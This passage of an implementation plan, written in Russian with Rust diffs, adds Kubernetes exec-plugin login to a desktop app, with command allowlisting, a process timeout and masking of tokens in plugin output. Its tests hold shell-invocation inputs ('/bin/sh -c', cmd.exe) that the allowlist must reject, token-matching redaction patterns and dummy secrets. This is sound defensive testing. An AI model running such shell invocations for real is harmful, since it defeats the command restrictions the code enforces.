+    /// и импорт kubeconfig по явному согласию; импорт файла обмена его сбрасывает.
+    #[serde(default)]
+    pub approved: Option<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct ExecEnv {
+    pub name: String,
+    pub value: String,
+}
+
+pub const EXEC_API_V1: &str = "client.authentication.k8s.io/v1";
+pub const EXEC_API_V1BETA1: &str = "client.authentication.k8s.io/v1beta1";
+
+fn default_exec_api_version() -> String {
+    EXEC_API_V1.to_string()
 }
 
 impl AuthConfig {
@@ -213,6 +255,9 @@ pub fn validate_profile(p: &ConnectionProfile) -> AppResult<()> {
             "The CA certificate must be in PEM format (-----BEGIN CERTIFICATE-----)"
         )));
     }
+    if let AuthConfig::Exec(e) = &p.auth {
+        validate_exec(e)?;
+    }
     if let ProxyConfig::Url { url } = &p.proxy {
         let ok = url::Url::parse(url.trim())
             .is_ok_and(|u| matches!(u.scheme(), "http" | "https") && u.host_str().is_some());
@@ -245,6 +290,69 @@ pub fn validate_profile(p: &ConnectionProfile) -> AppResult<()> {
     Ok(())
 }
 
+/// Exec-плагин: абсолютный путь, команда из списка разрешённых, известная версия API,
+/// корректные имена переменных окружения.
+fn validate_exec(e: &ExecAuth) -> AppResult<()> {
+    if e.command.trim().is_empty() {
+        return Err(invalid(ltext!(
+            "errors.exec.commandMissing",
+            "Specify the exec plugin command"
+        )));
+    }
+    if !std::path::Path::new(&e.command).is_absolute() {
+        return Err(invalid(ltext!(
+            "errors.exec.commandNotAbsolute",
+            "Specify the full path to “{{command}}” — use “Find”",
+            command = e.command
+        )));
+    }
+    crate::auth::exec::check_allowed(&e.command, &e.args).map_err(invalid)?;
+    if e.api_version != EXEC_API_V1 && e.api_version != EXEC_API_V1BETA1 {
+        return Err(invalid(ltext!(
+            "errors.exec.badApiVersion",
+            "Unsupported exec plugin API version “{{version}}”: use {{expected}}",
+            version = e.api_version,
+            expected = EXEC_API_V1
+        )));
+    }
+    if let Some(v) = e
+        .env
+        .iter()
+        .find(|v| v.name.trim().is_empty() || v.name.contains('=') || v.name.contains('\0'))
+    {
+        return Err(invalid(ltext!(
+            "errors.exec.badEnvName",
+            "Invalid environment variable name “{{name}}”",
+            name = v.name
+        )));
+    }
+    Ok(())
+}
+
+/// Exec-плагин для тестов: `kubectl oidc-login get-token` по абсолютному пути.
+#[cfg(test)]
+pub fn sample_exec() -> ExecAuth {
+    ExecAuth {
+        command: if cfg!(windows) {
+            r"C:\tools\kubectl.exe".into()
+        } else {
+            "/usr/local/bin/kubectl".into()
+        },
+        args: vec![
+            "oidc-login".into(),
+            "get-token".into(),
+            "--oidc-issuer-url=https://sso.corp/realms/k8s".into(),
+        ],
+        env: vec![ExecEnv {
+            name: "HTTPS_PROXY".into(),
+            value: "http://proxy:3128".into(),
+        }],
+        api_version: EXEC_API_V1.into(),
+        provide_cluster_info: false,
+        approved: None,
+    }
+}
+
 #[cfg(test)]
 pub fn sample_profile(id: &str) -> ConnectionProfile {
     ConnectionProfile {
@@ -304,6 +412,87 @@ mod tests {
         assert_eq!(back, p);
     }
 
+    #[test]
+    fn exec_json_shape() {
+        let mut p = sample_profile("x");
+        p.auth = AuthConfig::Exec(sample_exec());
+        let v = serde_json::to_value(&p).unwrap();
+        assert_eq!(v["auth"]["method"], "exec");
+        assert_eq!(v["auth"]["args"][0], "oidc-login");
+        assert_eq!(
+            v["auth"]["env"][0],
+            serde_json::json!({"name": "HTTPS_PROXY", "value": "http://proxy:3128"})
+        );
+        assert_eq!(v["auth"]["apiVersion"], EXEC_API_V1);
+        assert_eq!(v["auth"]["approved"], serde_json::Value::Null);
+        assert!(!p.auth.uses_token());
+        let back: ConnectionProfile = serde_json::from_value(v).unwrap();
+        assert_eq!(back, p);
+        // Минимальный exec из более старого файла: версия API по умолчанию.
+        let a: AuthConfig =
+            serde_json::from_value(serde_json::json!({"method": "exec", "command": "/bin/oc"}))
+                .unwrap();
+        let AuthConfig::Exec(e) = a else {
+            panic!("exec")
+        };
+        assert_eq!((e.api_version.as_str(), e.args.len()), (EXEC_API_V1, 0));
+    }
+
+    type ExecChange = Box<dyn Fn(&mut ExecAuth)>;
+
+    #[test]
+    fn exec_validation() {
+        let ok = |e: ExecAuth| {
+            let mut p = sample_profile("a");
+            p.auth = AuthConfig::Exec(e);
+            validate_profile(&p)
+        };
+        assert!(ok(sample_exec()).is_ok());
+        let cases: Vec<(&str, ExecChange)> = vec![
+            (
+                "errors.exec.commandMissing",
+                Box::new(|e| e.command = " ".into()),
+            ),
+            (
+                "errors.exec.commandNotAbsolute",
+                Box::new(|e| e.command = "kubectl".into()),
+            ),
+            (
+                "errors.exec.argsNotAllowed",
+                Box::new(|e| e.args = vec!["get".into(), "pods".into()]),
+            ),
+            (
+                "errors.exec.notAllowed",
+                Box::new(|e| {
+                    e.command = if cfg!(windows) {
+                        r"C:\Windows\cmd.exe".into()
+                    } else {
+                        "/bin/sh".into()
+                    }
+                }),
+            ),
+            (
+                "errors.exec.badApiVersion",
+                Box::new(|e| e.api_version = "client.authentication.k8s.io/v1alpha1".into()),
+            ),
+            (
+                "errors.exec.badEnvName",
+                Box::new(|e| {
+                    e.env = vec![ExecEnv {
+                        name: "A=B".into(),
+                        value: "x".into(),
+                    }]
+                }),
+            ),
+        ];
+        for (key, change) in cases {
+            let mut e = sample_exec();
+            change(&mut e);
+            let err = ok(e).unwrap_err();
+            assert_eq!((err.code, err.key.as_str()), (ErrorCode::InvalidInput, key));
+        }
+    }
+
     #[test]
     fn minimal_json_gets_defaults() {
         let p: ConnectionProfile = serde_json::from_value(serde_json::json!({
````

Применить: `python3 /tmp/o1a-blocks.py step 9.2`.

- [ ] **Step 3: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 152 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 4: Commit.**

```bash
git add -A
git commit -s -m "feat(auth): exec-плагины — список разрешённых команд, путь к команде, подтверждение строки запуска, политика allowExecAuth" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 10: Exec-плагины: запуск, учётные данные, подключение и проверка

**Files:**
- Modify: `src-tauri/Cargo.toml`, `src-tauri/src/auth/exec.rs`, `src-tauri/src/auth/mod.rs`, `src-tauri/src/k8s/config.rs`, `src-tauri/src/k8s/connectivity.rs`, `src-tauri/src/k8s/pool.rs`, `src-tauri/src/state.rs`

**Interfaces:**
- Consumes: задачи 6–9.
- Produces: `auth::Logins::{begin(id) -> (u64, oneshot::Receiver<()>), cancel(id) -> bool, finish(id, n)}`, `AppState.logins`; `auth::exec::{PluginCredential { token, client_certificate_pem, client_key_pem, expires_at }, parse_credential, mask_output, exec_info(&ExecAuth, &ConnectionProfile) -> String, shell_path, login_shell_path, command_dirs() -> Vec<PathBuf>, run(&ExecAuth, exec_info, path_env, cancel, limit), credential_for(&ConnectionProfile, cancel, limit) -> AppResult<PluginCredential>}`; `k8s::config::apply_exec_credential(&mut kube::Config, &PluginCredential)`; `k8s::pool::{Connected.expires_at, Connected::expiring(now), ClientPool::connect_lock(id), open(profile, secrets, cancel)}`; `connectivity::test_connection(profile, secrets, &PolicyStatus, cancel)`; ключи `messages.connectionTest.{execOk, execOkUntil}`.

Спец. §5.2–5.3. Плагин запускает Glafira, а не `kube` (уточнение спеки: в `kube` 4.2 запуск блокирующий, без таймаута и отмены, а текст ошибки содержит переменные окружения): `tokio::process` без оболочки, `stdin` закрыт, `KUBERNETES_EXEC_INFO` с `interactive: false` (и кластером при `provideClusterInfo`), PATH процесса — каталог команды, PATH оболочки входа (`$SHELL -l -c`, один раз за запуск) и стандартные каталоги; ожидание — до 5 мин, отмена — как у входа через браузер (`Logins` переезжают сюда и отменяют и ожидание плагина). Ошибка плагина — `AUTH_FAILED` с кодом выхода и хвостом stderr без токенов и значений секретных переменных. Учётные данные (токен или клиентский сертификат) подставляет `apply_exec_credential` и держит пул до `expirationTimestamp`: за минуту до срока `connected` подключается заново и запускает плагин снова. Подключения одного профиля идут по очереди (`connect_lock`), чтобы плагин не запускался дважды. Проверка подключения: неподтверждённая строка запуска — ошибка шага `config`, запуск плагина — шаг `exec` после TCP. Тесты плагина — скрипты `sh` с именем `kubectl` (только unix).

- [ ] **Step 1: Реализация.**

<!-- block: patch t10-src step=10.1 -->
````diff
diff --git a/src-tauri/Cargo.toml b/src-tauri/Cargo.toml
--- a/src-tauri/Cargo.toml
+++ b/src-tauri/Cargo.toml
@@ -29,18 +29,19 @@ plist = "1"
 pem = "3"
 url = "2"
 uuid = { version = "1", features = ["v4"] }
-time = { version = "0.3", features = ["formatting"] }
+time = { version = "0.3", features = ["formatting", "parsing"] }
 kube = { version = "4.2", default-features = false, features = ["client", "rustls-tls", "ring", "http-proxy"] }
 k8s-openapi = { version = "0.28", features = ["v1_32"] }
 http = "1"
 secrecy = "0.10"
 base64 = "0.22"
 regex = "1"
-tokio = { version = "1", features = ["rt", "macros", "time", "net", "io-util", "sync"] }
+tokio = { version = "1", features = ["rt", "macros", "time", "net", "io-util", "sync", "process"] }
 reqwest = { version = "0.13", default-features = false, features = ["rustls-no-provider", "json", "form", "http2", "system-proxy"] }
 rustls = { version = "0.23", default-features = false, features = ["ring", "std", "tls12"] }
 sha2 = "0.11"
 getrandom = "0.4"
+dirs = "7"
 sys-locale = "0.3"
 
 [target.'cfg(windows)'.dependencies]
diff --git a/src-tauri/src/auth/exec.rs b/src-tauri/src/auth/exec.rs
--- a/src-tauri/src/auth/exec.rs
+++ b/src-tauri/src/auth/exec.rs
@@ -1,13 +1,22 @@
 //! Exec-плагины kubeconfig (спец. §5.2): список разрешённых команд, путь к команде, строка запуска
-//! и её подтверждение человеком. Glafira запускает только команды из списка, по абсолютному пути
-//! и без оболочки.
+//! и её подтверждение человеком, запуск и учётные данные. Glafira запускает только команды из
+//! списка, по абсолютному пути и без оболочки; плагин запускает Glafira, а не `kube`: в `kube`
+//! запуск блокирующий, без таймаута и отмены, а текст ошибки содержит переменные окружения.
 
 use std::path::{Path, PathBuf};
+use std::process::Stdio;
+use std::time::{Duration, SystemTime};
 
+use base64::Engine;
+use base64::engine::general_purpose::STANDARD;
+use secrecy::SecretString;
+use serde::Deserialize;
 use sha2::{Digest, Sha256};
+use tokio::sync::oneshot;
 
+use crate::error::{AppError, AppResult, ErrorCode};
 use crate::i18n::LocalizedText;
-use crate::storage::profile::ExecAuth;
+use crate::storage::profile::{AuthConfig, CaConfig, ConnectionProfile, ExecAuth, ProxyConfig};
 
 /// Разрешённые команды: имя исполняемого файла и первые позиционные аргументы
 /// (пустой список — любые аргументы).
@@ -185,6 +194,279 @@ pub fn resolve_command(
     })
 }
 
+/// Учётные данные от плагина: токен или клиентский сертификат и срок действия.
+#[derive(Debug, Clone)]
+pub struct PluginCredential {
+    pub token: Option<SecretString>,
+    pub client_certificate_pem: Option<String>,
+    pub client_key_pem: Option<SecretString>,
+    /// `expirationTimestamp`: до этого времени Glafira не запускает плагин снова.
+    pub expires_at: Option<SystemTime>,
+}
+
+#[derive(Deserialize)]
+struct CredentialOut {
+    status: Option<CredentialStatus>,
+}
+
+#[derive(Deserialize)]
+#[serde(rename_all = "camelCase")]
+struct CredentialStatus {
+    token: Option<String>,
+    client_certificate_data: Option<String>,
+    client_key_data: Option<String>,
+    expiration_timestamp: Option<String>,
+}
+
+/// Разбор `ExecCredential` из вывода плагина. Ошибка — причина без содержимого вывода.
+pub fn parse_credential(stdout: &[u8]) -> Result<PluginCredential, String> {
+    let out: CredentialOut = serde_json::from_slice(stdout).map_err(|e| e.to_string())?;
+    let s = out.status.ok_or("no status in ExecCredential")?;
+    let expires_at = s
+        .expiration_timestamp
+        .map(|ts| {
+            time::OffsetDateTime::parse(&ts, &time::format_description::well_known::Rfc3339)
+                .map(SystemTime::from)
+                .map_err(|e| format!("expirationTimestamp: {e}"))
+        })
+        .transpose()?;
+    let token = s
+        .token
+        .map(|t| t.trim().to_string())
+        .filter(|t| !t.is_empty());
+    let cert = s.client_certificate_data.filter(|c| !c.trim().is_empty());
+    let key = s.client_key_data.filter(|k| !k.trim().is_empty());
+    if token.is_none() && (cert.is_none() || key.is_none()) {
+        return Err("neither token nor clientCertificateData and clientKeyData".into());
+    }
+    Ok(PluginCredential {
+        token: token.map(SecretString::from),
+        client_certificate_pem: cert,
+        client_key_pem: key.map(SecretString::from),
+        expires_at,
+    })
+}
+
+/// Вывод плагина для сообщения об ошибке: без токенов (JWT, `sha256~…`, `Bearer …`) и значений
+/// переменных, похожих на секреты; не длиннее 2000 символов (хвост — там обычно причина).
+pub fn mask_output(text: &str, secrets: &[&str]) -> String {
+    let mut out = text.to_string();
+    for s in secrets.iter().filter(|s| s.len() >= 4) {
+        out = out.replace(s, "***");
+    }
+    let jwt = regex::Regex::new(r"eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*")
+        .expect("valid regex");
+    let sha = regex::Regex::new(r"sha256~[A-Za-z0-9_-]+").expect("valid regex");
+    let bearer = regex::Regex::new(r"(?i)(bearer\s+)\S+").expect("valid regex");
+    out = jwt.replace_all(&out, "***").into_owned();
+    out = sha.replace_all(&out, "sha256~***").into_owned();
+    out = bearer.replace_all(&out, "${1}***").into_owned();
+    let chars: Vec<char> = out.trim().chars().collect();
+    if chars.len() > 2000 {
+        format!(
+            "…{}",
+            chars[chars.len() - 2000..].iter().collect::<String>()
+        )
+    } else {
+        chars.into_iter().collect()
+    }
+}
+
+/// `KUBERNETES_EXEC_INFO` для плагина: версия API, `interactive: false` (терминала у приложения
+/// нет) и, если `provideClusterInfo`, адрес, CA и прокси кластера.
+pub fn exec_info(e: &ExecAuth, p: &ConnectionProfile) -> String {
+    let mut spec = serde_json::json!({"interactive": false});
+    if e.provide_cluster_info {
+        let mut cluster = serde_json::json!({"server": p.api_url});
+        match &p.ca {
+            CaConfig::Pem { pem } => {
+                cluster["certificate-authority-data"] = STANDARD.encode(pem).into();
+            }
+            CaConfig::Insecure => cluster["insecure-skip-tls-verify"] = true.into(),
+            CaConfig::System => {}
+        }
+        if let Some(name) = &p.tls_server_name {
+            cluster["tls-server-name"] = name.clone().into();
+        }
+        if let ProxyConfig::Url { url } = &p.proxy {
+            cluster["proxy-url"] = url.clone().into();
+        }
+        spec["cluster"] = cluster;
+    }
+    serde_json::json!({"apiVersion": e.api_version, "kind": "ExecCredential", "spec": spec})
+        .to_string()
+}
+
+const PATH_MARK: &str = "__GLAFIRA_PATH__";
+
+/// PATH оболочки входа `shell` (`-l -c`): у приложения, запущенного из Dock, PATH короткий.
+pub async fn shell_path(shell: &Path, limit: Duration) -> Option<String> {
+    let mut cmd = tokio::process::Command::new(shell);
+    cmd.args([
+        "-l",
+        "-c",
+        r#"printf '__GLAFIRA_PATH__%s__GLAFIRA_PATH__' "$PATH""#,
+    ])
+    .stdin(Stdio::null())
+    .stdout(Stdio::piped())
+    .stderr(Stdio::null())
+    .kill_on_drop(true);
+    let out = tokio::time::timeout(limit, cmd.output()).await.ok()?.ok()?;
+    let text = String::from_utf8_lossy(&out.stdout);
+    let start = text.find(PATH_MARK)? + PATH_MARK.len();
+    let end = start + text[start..].find(PATH_MARK)?;
+    Some(text[start..end].to_string()).filter(|p| !p.is_empty())
+}
+
+static LOGIN_PATH: tokio::sync::OnceCell<Option<String>> = tokio::sync::OnceCell::const_new();
+
+/// PATH оболочки входа пользователя (один раз за запуск); на Windows и при ошибке — `None`.
+pub async fn login_shell_path() -> Option<String> {
+    LOGIN_PATH
+        .get_or_init(|| async {
+            if cfg!(windows) {
+                return None;
+            }
+            let shell = std::env::var("SHELL")
+                .ok()
+                .filter(|s| !s.trim().is_empty())
+                .unwrap_or_else(|| "/bin/sh".into());
+            shell_path(Path::new(&shell), Duration::from_secs(5)).await
+        })
+        .await
+        .clone()
+}
+
+/// Каталоги поиска команд на этой машине: PATH оболочки входа (или процесса) и стандартные.
+pub async fn command_dirs() -> Vec<PathBuf> {
+    let path = match login_shell_path().await {
+        Some(p) => Some(p),
+        None => std::env::var("PATH").ok(),
+    };
+    let local = std::env::var_os("LOCALAPPDATA").map(PathBuf::from);
+    search_dirs(
+        path.as_deref(),
+        standard_dirs(dirs::home_dir().as_deref(), local.as_deref()),
+    )
+}
+
+/// PATH для процесса плагина: каталог самой команды и каталоги поиска (`kubectl oidc-login`
+/// ищет `kubectl-oidc_login` в PATH, `kubelogin` — `az`).
+fn plugin_path(command: &Path, dirs: &[PathBuf]) -> Option<String> {
+    let own = command.parent().map(Path::to_path_buf);
+    let all: Vec<&PathBuf> = own.iter().chain(dirs).collect();
+    std::env::join_paths(all)
+        .ok()
+        .map(|p| p.to_string_lossy().to_string())
+}
+
+/// Запускает плагин: без оболочки, `stdin` закрыт, не дольше `limit`; `cancel` прерывает
+/// ожидание (как у входа через браузер). Процесс завершается вместе с ожиданием.
+pub async fn run(
+    e: &ExecAuth,
+    exec_info: &str,
+    path_env: Option<&str>,
+    cancel: oneshot::Receiver<()>,
+    limit: Duration,
+) -> AppResult<PluginCredential> {
+    check_allowed(&e.command, &e.args)
+        .map_err(|t| AppError::localized(ErrorCode::AuthFailed, t))?;
+    let name = command_name(&e.command);
+    let mut cmd = tokio::process::Command::new(&e.command);
+    cmd.args(&e.args)
+        .envs(e.env.iter().map(|v| (&v.name, &v.value)))
+        .env("KUBERNETES_EXEC_INFO", exec_info)
+        .stdin(Stdio::null())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .kill_on_drop(true);
+    if let Some(p) = path_env {
+        cmd.env("PATH", p);
+    }
+    #[cfg(windows)]
+    {
+        // CREATE_NO_WINDOW: без мелькающего окна консоли.
+        cmd.creation_flags(0x0800_0000);
+    }
+    let start_error = |err: std::io::Error| {
+        app_err!(
+            ErrorCode::AuthFailed,
+            "errors.exec.start",
+            "Cannot start the exec plugin {{command}}: {{error}}",
+            command = name,
+            error = err
+        )
+    };
+    let child = cmd.spawn().map_err(start_error)?;
+    let output = tokio::select! {
+        out = child.wait_with_output() => out.map_err(start_error)?,
+        _ = cancel => return Err(crate::auth::callback::cancelled()),
+        _ = tokio::time::sleep(limit) => {
+            return Err(app_err!(
+                ErrorCode::Timeout,
+                "errors.exec.timeout",
+                "The exec plugin {{command}} did not finish in {{seconds}} s",
+                command = name,
+                seconds = limit.as_secs()
+            ));
+        }
+    };
+    let secrets: Vec<&str> = e
+        .env
+        .iter()
+        .filter(|v| is_secret_name(&v.name))
+        .map(|v| v.value.as_str())
+        .collect();
+    if !output.status.success() {
+        let code = output
+            .status
+            .code()
+            .map_or_else(|| "—".to_string(), |c| c.to_string());
+        return Err(app_err!(
+            ErrorCode::AuthFailed,
+            "errors.exec.failed",
+            "The exec plugin {{command}} failed (exit code {{code}})",
+            command = name,
+            code = code
+        )
+        .with_details(mask_output(
+            &String::from_utf8_lossy(&output.stderr),
+            &secrets,
+        )));
+    }
+    parse_credential(&output.stdout).map_err(|reason| {
+        app_err!(
+            ErrorCode::AuthFailed,
+            "errors.exec.badOutput",
+            "The exec plugin {{command}} returned no credentials",
+            command = name
+        )
+        .with_details(reason)
+    })
+}
+
+/// Учётные данные подключения с exec-плагином: только по подтверждённой строке запуска
+/// (спец. §5.2). Политику проверяет вызывающий код (`ensure_allowed`).
+pub async fn credential_for(
+    p: &ConnectionProfile,
+    cancel: oneshot::Receiver<()>,
+    limit: Duration,
+) -> AppResult<PluginCredential> {
+    let AuthConfig::Exec(e) = &p.auth else {
+        return Err(AppError::internal_with("not an exec plugin connection"));
+    };
+    if !is_approved(e) {
+        return Err(app_err!(
+            ErrorCode::AuthFailed,
+            "errors.exec.notApproved",
+            "Confirm the exec plugin launch line in the connection settings"
+        ));
+    }
+    let dirs = command_dirs().await;
+    let path = plugin_path(Path::new(&e.command), &dirs);
+    run(e, &exec_info(e, p), path.as_deref(), cancel, limit).await
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -392,4 +674,263 @@ mod tests {
         );
         assert_eq!(resolve_command(" ", None, &dirs, &is_file), None);
     }
+
+    #[test]
+    fn credentials_from_plugin_output() {
+        use secrecy::ExposeSecret;
+        let c = parse_credential(
+            br#"{"apiVersion":"client.authentication.k8s.io/v1","kind":"ExecCredential",
+                "status":{"token":" t1 ","expirationTimestamp":"2030-01-01T00:00:00Z"}}"#,
+        )
+        .unwrap();
+        assert_eq!(c.token.unwrap().expose_secret(), "t1");
+        assert_eq!(
+            c.expires_at.unwrap(),
+            SystemTime::UNIX_EPOCH + Duration::from_secs(1_893_456_000)
+        );
+        let c = parse_credential(
+            br#"{"status":{"clientCertificateData":"CERT","clientKeyData":"KEY"}}"#,
+        )
+        .unwrap();
+        assert!(c.token.is_none() && c.expires_at.is_none());
+        assert_eq!(c.client_certificate_pem.as_deref(), Some("CERT"));
+        for bad in [
+            &b"not json"[..],
+            br#"{"kind":"ExecCredential"}"#,
+            br#"{"status":{"token":""}}"#,
+            br#"{"status":{"clientCertificateData":"CERT"}}"#,
+            br#"{"status":{"token":"t","expirationTimestamp":"tomorrow"}}"#,
+        ] {
+            assert!(
+                parse_credential(bad).is_err(),
+                "{}",
+                String::from_utf8_lossy(bad)
+            );
+        }
+    }
+
+    #[test]
+    fn plugin_output_is_masked() {
+        let text = "error: token eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1In0.c2lnbmF0dXJl expired\n\
+                    Authorization: Bearer abc.def\nsha256~Zm9vYmFy\nsecret=hunter22";
+        let m = mask_output(text, &["hunter22"]);
+        for leaked in ["eyJhbGci", "abc.def", "Zm9vYmFy", "hunter22"] {
+            assert!(!m.contains(leaked), "{leaked}: {m}");
+        }
+        assert!(m.contains("Bearer ***") && m.contains("sha256~***"), "{m}");
+        let long = "x".repeat(5000);
+        assert_eq!(mask_output(&long, &[]).chars().count(), 2001);
+    }
+
+    #[test]
+    fn exec_info_has_cluster_only_on_request() {
+        let mut p = crate::storage::profile::sample_profile("a");
+        let mut e = sample_exec();
+        let v: serde_json::Value = serde_json::from_str(&exec_info(&e, &p)).unwrap();
+        assert_eq!(v["kind"], "ExecCredential");
+        assert_eq!(v["apiVersion"], "client.authentication.k8s.io/v1");
+        assert_eq!(v["spec"]["interactive"], false);
+        assert!(v["spec"]["cluster"].is_null());
+        e.provide_cluster_info = true;
+        p.ca = CaConfig::Pem { pem: "PEM".into() };
+        let v: serde_json::Value = serde_json::from_str(&exec_info(&e, &p)).unwrap();
+        assert_eq!(
+            v["spec"]["cluster"]["server"],
+            "https://api.dev.example.com:6443"
+        );
+        assert_eq!(v["spec"]["cluster"]["certificate-authority-data"], "UEVN");
+    }
+
+    /// Плагины в тестах — скрипт `sh` с именем `kubectl` (`oidc-login get-token <режим>`).
+    #[cfg(unix)]
+    mod running {
+        use super::*;
+
+        const SCRIPT: &str = r#"#!/bin/sh
+case "$3" in
+  ok) printf '{"kind":"ExecCredential","status":{"token":"tok-%s","expirationTimestamp":"2030-01-01T00:00:00Z"}}' "$TEAM" ;;
+  info) printf '%s' "$KUBERNETES_EXEC_INFO" > "$INFO_FILE"; printf '{"status":{"token":"t"}}' ;;
+  path) printf '{"status":{"token":"%s"}}' "$PATH" ;;
+  fail) echo "refresh token eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1In0.c2lnbmF0dXJl expired, key $AWS_SECRET_ACCESS_KEY" >&2; exit 3 ;;
+  slow) sleep 30 ;;
+  garbage) echo "not json" ;;
+esac
+"#;
+
+        fn plugin(dir: &Path, mode: &str) -> ExecAuth {
+            use std::os::unix::fs::PermissionsExt;
+            let path = dir.join("kubectl");
+            std::fs::write(&path, SCRIPT).unwrap();
+            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
+            ExecAuth {
+                command: path.display().to_string(),
+                args: vec!["oidc-login".into(), "get-token".into(), mode.into()],
+                env: vec![
+                    ExecEnv {
+                        name: "TEAM".into(),
+                        value: "a".into(),
+                    },
+                    ExecEnv {
+                        name: "AWS_SECRET_ACCESS_KEY".into(),
+                        value: "s3cr3t-value".into(),
+                    },
+                ],
+                ..sample_exec()
+            }
+        }
+
+        async fn go(e: &ExecAuth, limit: Duration) -> AppResult<PluginCredential> {
+            let (_keep, cancel) = oneshot::channel();
+            run(e, "{}", None, cancel, limit).await
+        }
+
+        #[tokio::test]
+        async fn token_env_and_expiry() {
+            use secrecy::ExposeSecret;
+            let dir = tempfile::tempdir().unwrap();
+            let c = go(&plugin(dir.path(), "ok"), Duration::from_secs(10))
+                .await
+                .unwrap();
+            assert_eq!(c.token.unwrap().expose_secret(), "tok-a");
+            assert!(c.expires_at.is_some());
+        }
+
+        #[tokio::test]
+        async fn exec_info_and_path_reach_the_plugin() {
+            use secrecy::ExposeSecret;
+            let dir = tempfile::tempdir().unwrap();
+            let info_file = dir.path().join("info.json");
+            let mut e = plugin(dir.path(), "info");
+            e.env.push(ExecEnv {
+                name: "INFO_FILE".into(),
+                value: info_file.display().to_string(),
+            });
+            let (_keep, cancel) = oneshot::channel();
+            run(
+                &e,
+                r#"{"kind":"ExecCredential"}"#,
+                None,
+                cancel,
+                Duration::from_secs(10),
+            )
+            .await
+            .unwrap();
+            assert_eq!(
+                std::fs::read_to_string(&info_file).unwrap(),
+                r#"{"kind":"ExecCredential"}"#
+            );
+            let e = plugin(dir.path(), "path");
+            let (_keep, cancel) = oneshot::channel();
+            let c = run(
+                &e,
+                "{}",
+                Some("/opt/x/bin:/usr/bin:/bin"),
+                cancel,
+                Duration::from_secs(10),
+            )
+            .await
+            .unwrap();
+            assert_eq!(c.token.unwrap().expose_secret(), "/opt/x/bin:/usr/bin:/bin");
+            let dirs = [PathBuf::from("/usr/bin")];
+            assert_eq!(
+                plugin_path(Path::new("/opt/homebrew/bin/kubectl"), &dirs).as_deref(),
+                Some("/opt/homebrew/bin:/usr/bin")
+            );
+        }
+
+        #[tokio::test]
+        async fn failure_reports_exit_code_and_masked_stderr() {
+            let dir = tempfile::tempdir().unwrap();
+            let e = go(&plugin(dir.path(), "fail"), Duration::from_secs(10))
+                .await
+                .unwrap_err();
+            assert_eq!(
+                (e.code, e.key.as_str()),
+                (ErrorCode::AuthFailed, "errors.exec.failed")
+            );
+            assert_eq!(e.params["code"], "3");
+            let details = e.details.unwrap();
+            assert!(details.contains("refresh token *** expired"), "{details}");
+            assert!(!details.contains("s3cr3t-value"), "{details}");
+            let e = go(&plugin(dir.path(), "garbage"), Duration::from_secs(10))
+                .await
+                .unwrap_err();
+            assert_eq!(e.key, "errors.exec.badOutput");
+        }
+
+        #[tokio::test]
+        async fn timeout_and_cancel_stop_the_plugin() {
+            let dir = tempfile::tempdir().unwrap();
+            let e = plugin(dir.path(), "slow");
+            let started = std::time::Instant::now();
+            let err = go(&e, Duration::from_millis(300)).await.unwrap_err();
+            assert_eq!(
+                (err.code, err.key.as_str()),
+                (ErrorCode::Timeout, "errors.exec.timeout")
+            );
+            let (tx, cancel) = oneshot::channel();
+            let waiting = tokio::spawn({
+                let e = e.clone();
+                async move { run(&e, "{}", None, cancel, Duration::from_secs(60)).await }
+            });
+            tokio::time::sleep(Duration::from_millis(100)).await;
+            tx.send(()).unwrap();
+            let err = waiting.await.unwrap().unwrap_err();
+            assert_eq!(err.key, "errors.oauth.cancelled");
+            assert!(
+                started.elapsed() < Duration::from_secs(10),
+                "процесс не ждали"
+            );
+        }
+
+        #[tokio::test]
+        async fn unapproved_or_foreign_command_is_not_started() {
+            let dir = tempfile::tempdir().unwrap();
+            let mut p = crate::storage::profile::sample_profile("a");
+            let mut e = plugin(dir.path(), "ok");
+            p.auth = AuthConfig::Exec(e.clone());
+            let (_keep, cancel) = oneshot::channel();
+            let err = credential_for(&p, cancel, Duration::from_secs(10))
+                .await
+                .unwrap_err();
+            assert_eq!(err.key, "errors.exec.notApproved");
+            e.approved = Some(fingerprint(&e));
+            p.auth = AuthConfig::Exec(e.clone());
+            let (_keep, cancel) = oneshot::channel();
+            assert!(
+                credential_for(&p, cancel, Duration::from_secs(10))
+                    .await
+                    .is_ok()
+            );
+            // Профиль поправили вручную: команда не из списка не запускается.
+            let sh = ExecAuth {
+                command: "/bin/sh".into(),
+                args: vec!["-c".into(), "echo".into()],
+                ..e
+            };
+            let err = go(&sh, Duration::from_secs(10)).await.unwrap_err();
+            assert_eq!(err.key, "errors.exec.notAllowed");
+        }
+
+        #[tokio::test]
+        async fn login_shell_path_between_markers() {
+            use std::os::unix::fs::PermissionsExt;
+            let dir = tempfile::tempdir().unwrap();
+            let shell = dir.path().join("fake-shell");
+            std::fs::write(
+                &shell,
+                "#!/bin/sh\necho 'motd from profile'\nprintf '__GLAFIRA_PATH__/a/bin:/b__GLAFIRA_PATH__'\n",
+            )
+            .unwrap();
+            std::fs::set_permissions(&shell, std::fs::Permissions::from_mode(0o755)).unwrap();
+            assert_eq!(
+                shell_path(&shell, Duration::from_secs(5)).await.as_deref(),
+                Some("/a/bin:/b")
+            );
+            assert_eq!(
+                shell_path(Path::new("/no/such/shell"), Duration::from_secs(5)).await,
+                None
+            );
+        }
+    }
 }
diff --git a/src-tauri/src/auth/mod.rs b/src-tauri/src/auth/mod.rs
--- a/src-tauri/src/auth/mod.rs
+++ b/src-tauri/src/auth/mod.rs
@@ -1,6 +1,79 @@
-//! Вход через браузер в OAuth OpenShift (спец. §5.2): Authorization Code + PKCE, как `oc login --web`.
+//! Вход через браузер в OAuth OpenShift (спец. §5.2): Authorization Code + PKCE, как `oc login --web`;
+//! exec-плагины kubeconfig.
 
 pub mod callback;
